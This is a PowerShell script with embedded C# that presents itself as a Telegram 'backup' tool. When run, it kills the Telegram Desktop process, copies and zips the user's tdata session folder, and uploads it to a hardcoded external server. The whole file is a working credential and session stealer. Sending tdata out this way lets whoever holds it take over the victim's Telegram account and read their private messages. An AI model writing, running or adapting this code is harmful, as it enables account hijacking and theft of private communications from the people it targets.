Add-Type -Language CSharp -ReferencedAssemblies "System.dll","System.Core.dll","System.IO.Compression.dll","System.IO.Compression.FileSystem.dll" -TypeDefinition @"
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Text;
using System.Threading;

public class TelegramTdataBackup
{
    const string SERVER_URL = "https://xenv2-mlxd.onrender.com";

    public static void BackupAndSend()
    {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

        string user = Environment.UserName;
        string defaultTdata = "C:\\Users\\" + user + "\\AppData\\Roaming\\Telegram Desktop\\tdata";
        string tempRoot = Path.GetTempPath();
        string tempCopyPath = Path.Combine(tempRoot, "telegram_tdata_tmp");
        string zipPath = Path.Combine(tempRoot, "telegram_tdata_backup.zip");

        StopTelegram();

        if (Directory.Exists(tempCopyPath))
            Directory.Delete(tempCopyPath, true);

        if (File.Exists(zipPath))
            File.Delete(zipPath);

        if (Directory.Exists(defaultTdata))
        {
            CopyAndZip(defaultTdata, tempCopyPath, zipPath);

            Console.WriteLine("Uploading backup ZIP to server...");
            SendTelegramFile(zipPath);
            return;
        }

        Console.WriteLine("Could not find Telegram tdata folder at default location.");
    }

    static void StopTelegram()
    {
        foreach (var process in Process.GetProcessesByName("Telegram"))
        {
            try
            {
                Console.WriteLine("Stopping Telegram process...");
                process.Kill();
                process.WaitForExit();
                Thread.Sleep(2000);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed to stop Telegram: " + ex.Message);
            }
        }
    }

    static void CopyAndZip(string source, string tempCopyPath, string zipPath)
    {
        Console.WriteLine("Copying tdata from: " + source);
        DirectoryCopy(source, tempCopyPath, true);
        ZipFile.CreateFromDirectory(tempCopyPath, zipPath);
        Console.WriteLine("Backup complete. ZIP saved at: " + zipPath);
    }

    static void DirectoryCopy(string sourceDir, string destDir, bool recursive)
    {
        DirectoryInfo dir = new DirectoryInfo(sourceDir);
        DirectoryInfo[] dirs = dir.GetDirectories();

        Directory.CreateDirectory(destDir);

        foreach (FileInfo file in dir.GetFiles())
        {
            string targetFilePath = Path.Combine(destDir, file.Name);
            file.CopyTo(targetFilePath, true);
        }

        if (recursive)
        {
            foreach (DirectoryInfo subDir in dirs)
            {
                string newDestinationDir = Path.Combine(destDir, subDir.Name);
                DirectoryCopy(subDir.FullName, newDestinationDir, true);
            }
        }
    }

    static void SendTelegramFile(string filePath)
    {
        if (!Path.IsPathRooted(filePath))
            filePath = Path.Combine(Directory.GetCurrentDirectory(), filePath);

        string uri = SERVER_URL.TrimEnd(new char[] { '/' }) + "/files";

        string fileName = Path.GetFileName(filePath);
        string boundary = "----WebKitFormBoundary" + Guid.NewGuid().ToString("N");

        byte[] fileContent = File.ReadAllBytes(filePath);

        string LF = "\r\n";
        string header = "--" + boundary + LF +
                        "Content-Disposition: form-data; name=\"document\"; filename=\"" + fileName + "\"" + LF +
                        "Content-Type: application/octet-stream" + LF + LF;

        string footer = LF + "--" + boundary + "--" + LF;

        byte[] headerBytes = Encoding.ASCII.GetBytes(header);
        byte[] footerBytes = Encoding.ASCII.GetBytes(footer);

        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
        request.Method = "POST";
        request.ContentType = "multipart/form-data; boundary=" + boundary;
        request.ContentLength = headerBytes.Length + fileContent.Length + footerBytes.Length;

        try
        {
            using (Stream requestStream = request.GetRequestStream())
            {
                requestStream.Write(headerBytes, 0, headerBytes.Length);
                requestStream.Write(fileContent, 0, fileContent.Length);
                requestStream.Write(footerBytes, 0, footerBytes.Length);
            }

            using (WebResponse response = request.GetResponse())
            using (StreamReader reader = new StreamReader(response.GetResponseStream()))
            {
                string respText = reader.ReadToEnd();
                Console.WriteLine("Upload response: " + respText);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Upload failed: " + ex.Message);
        }
    }
}
"@

[TelegramTdataBackup]::BackupAndSend()
